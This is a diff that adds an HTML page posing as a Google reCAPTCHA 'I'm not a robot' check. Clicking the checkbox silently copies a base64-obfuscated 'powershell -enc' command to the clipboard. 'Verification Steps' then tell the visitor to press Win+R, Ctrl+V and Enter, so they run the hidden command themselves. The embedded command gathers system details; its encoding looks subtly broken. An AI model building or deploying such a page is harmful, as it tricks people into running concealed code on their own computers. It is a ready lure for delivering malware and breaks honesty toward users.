@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Captcha Verifycation</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>reCAPTCHA</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            color: #000000;
+        }
+
+        .recaptcha-mock {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            width: 262px;
+            height: 58px;
+            background-color: #f9f9f9;
+            border: 1px solid #dcdcdc;
+            border-radius: 3px;
+            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.2);
+            padding: 10px;
+            font-family: Arial, sans-serif;
+            position: relative;
+        }
+
+        .recaptcha-checkbox {
+            display: inline-block;
+            width: 20px;
+            position: absolute;
+            margin-left: -190px;
+            height: 20px;
+            border: 1px solid #dcdcdc;
+            background-color: #fff;
+            border-radius: 3px;
+            vertical-align: middle;
+            margin-right: 10px;
+            position: relative;
+            cursor: pointer;
+        }
+
+        .recaptcha-checkbox::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 10px;
+            height: 10px;
+            background-color: #4285f4;
+            border-radius: 2px;
+            transform: translate(-50%, -50%) scale(0);
+            transition: transform 0.2s ease;
+        }
+
+        .recaptcha-checkbox.checked::after {
+            transform: translate(-50%, -50%) scale(1);
+        }
+
+        .recaptcha-label {
+            display: flex;
+            position: absolute;
+            margin-left: -70px;
+            font-size: 14px;
+            color: #333;
+            vertical-align: middle;
+        }
+
+        .recaptcha-logo {
+            position: absolute;
+            bottom: 5px;
+            right: 10px;
+            font-size: 10px;
+            color: #666;
+            font-family: Arial, sans-serif;
+        }
+
+        .loadImg {
+            display: none;
+            width: 20px;
+            height: 20px;
+            position: absolute;
+            margin-top: -3px;
+            margin-left: -210px;
+            border: 2px solid #4688f1;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {transform: rotate(360deg);}
+        }
+    </style>
+</head>
+<body>
+    <div style="position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.7);">
+        <div style="position: absolute; left: 50%; transform: translateX(-50%); top: 30%; background-color: white; border-radius: 8px; width: 600px; height: 200px; padding: 20px;">
+            <h2 style="text-align: center;">Robot or human?</h2>
+            <p style="text-align: center;">Check the box to confirm that you're human. Thank You!</p>
+            <div id="captcha-container" style="display: block; justify-content: center; align-items: center; text-align: center; position: absolute; left: 28%;">
+                <div class="recaptcha-mock">
+                    <div class="recaptcha-checkbox" onclick="showVerification()" style="cursor: pointer;"></div>
+                    <div class="loadImg"></div>
+                    <span class="recaptcha-label" style="margin-left: 10px;">I'm not a robot</span>
+                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" style="width: 32px; height: 32px; position: absolute; margin-right: -200px; margin-top: -15px;">
+                    <div class="recaptcha-logo">reCAPTCHA</div>
+                </div>
+                <div style="display: none; position: absolute; width: 282px; justify-content: center; align-items: center; background-color: #f9f9f9; border: 1px solid #dcdcdc; border-radius: 5px;" id="verificationSteps">
+                    <div class="checkbtn-steps arrow-5-top">
+                        <div style="font-size: 20px; margin-top: 10px; text-align: center;">
+                            Verification Steps
+                        </div>
+                        <div style="margin-top: 15px; margin-left: 15px;">
+                            1. Press Windows Button "Windows" + R
+                        </div>
+                        <div style="margin-top: 10px; margin-left: 15px;">
+                            2. Press CTRL + V
+                        </div>
+                        <div style="margin-top: 10px; margin-left: 15px; margin-bottom: 15px;">
+                            3. Press Enter
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <p id="message" style="text-align: center; color: red;"></p>
+        </div>
+    </div>
+
+    <script>
+        let obfuscatedCommand = '';
+
+        function obfuscateCommand(command) {
+            const encoded = btoa(command);
+            return `powershell -enc ${encoded}`;
+        }
+
+        function generateCommand() {
+            const command = "Get-ComputerInfo | Select-Object WindowsProductName, OsVersion, CsProcessors, CsNumberOfLogicalProcessors | ConvertTo-Json";
+            obfuscatedCommand = obfuscateCommand(command);
+        }
+
+        function showVerification() {
+            const checkbox = document.querySelector('.recaptcha-checkbox');
+            const loadImg = document.querySelector('.loadImg');
+            
+            // Hide the checkbox immediately
+            checkbox.style.display = 'none';
+            // Show the spinner
+            loadImg.style.display = 'block';
+            
+            setTimeout(() => {
+                document.getElementById('verificationSteps').style.display = 'block';
+                // Generate and copy command
+                generateCommand();
+                navigator.clipboard.writeText(obfuscatedCommand).catch(err => {
+                    console.error('Failed to copy command:', err);
+                });
+            }, 1000);
+        }
+
+        // Generate initial command
+        generateCommand();
+    </script>
+</body>
+</html> 
